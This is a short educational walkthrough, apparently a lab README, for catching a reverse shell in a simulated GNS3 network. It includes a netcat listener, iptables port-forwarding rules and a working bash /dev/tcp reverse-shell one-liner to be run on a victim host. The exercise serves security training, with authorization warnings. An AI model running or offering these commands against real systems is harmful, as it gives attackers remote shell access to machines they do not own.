# Reverse Shell Exercise in GNS3

# Note: Unauthorized penetration testing is illegal. Conduct this exercise only in an educational or authorized setting.

This document provides step-by-step instructions for setting up a reverse shell using a simulated environment in GNS3. Please note that this is for educational purposes and should only be conducted in an environment where you have explicit authorization.

## Table of Contents

1. [Set Up Listener on the Kali Machine](#step-1-set-up-listener-on-the-kali-machine)
2. [Configure Port Forwarding on the Router](#step-2-configure-port-forwarding-on-the-router)
3. [Create and Deliver the Payload](#step-3-create-and-deliver-the-payload)
4. [Catch the Reverse Shell](#step-4-catch-the-reverse-shell)
5. [Monitor Traffic (Optional)](#step-5-monitor-traffic-optional)
6. [Post-Test Cleanup](#step-6-post-test-cleanup)


## Step 1: Set Up Listener on the Kali Machine

Open the terminal on the Kali machine and run the following command:

```bash
nc -nlvp 4444
```


## Step 2: Configure Port Forwarding on the Router

Assuming a Linux-based router in GNS3, open its terminal and run:

```bash
sudo iptables -t nat -A PREROUTING -p tcp --dport 4444 -j DNAT --to-destination 192.168.122.208:4444
sudo iptables -t nat -A POSTROUTING -j MASQUERADE
```

## Step 3: Create and Deliver the Payload

Execute the following shell command on the victim machine (192.168.122.47):

```bash
/bin/bash -i >& /dev/tcp/192.168.122.208/4444 0>&1
```

## Step 4: Catch the Reverse Shell

If everything is set up correctly, the Netcat listener on your Kali machine should catch the reverse shell from the victim machine.

## Step 5: Monitor Traffic (Optional)

You can use Wireshark for this purpose. To capture packets in GNS3, right-click on a connection and choose "Start Capture".

## Step 6: Post-Test Cleanup

To disable the port forwarding rules and stop the Netcat listener:

```bash
sudo iptables -t nat -D PREROUTING -p tcp --dport 4444 -j DNAT --to-destination 192.168.122.208:4444
sudo iptables -t nat -D POSTROUTING -j MASQUERADE
```
# Note: Unauthorized penetration testing is illegal. Conduct this exercise only in an educational or authorized setting.

